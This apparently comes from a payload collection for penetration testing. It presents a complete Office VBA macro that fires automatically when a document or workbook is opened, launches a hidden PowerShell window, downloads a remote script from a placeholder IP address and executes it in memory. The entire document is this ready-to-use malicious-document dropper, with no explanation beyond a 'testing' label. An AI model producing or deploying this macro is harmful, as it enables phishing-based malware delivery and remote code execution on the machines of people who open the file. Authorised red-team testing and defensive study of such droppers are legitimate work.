Macros Section for testing payloads

A simple Macro Payload to execute a URL via PowerShell

``

Sub Auto_Open()
   Dim exec As String
   Dim payload As String
   exec = "powershell.exe -WindowStyle hidden -nologo -noprofile -c ""IEX ((New-Object Net.WebClient).DownloadString('https://10.10.10.10./payload.ps1'))"""
   Shell (exec)
End Sub
Sub AutoOpen()
    Auto_Open
End Sub
Sub Workbook_Open()
   Auto_Open
End Sub

``
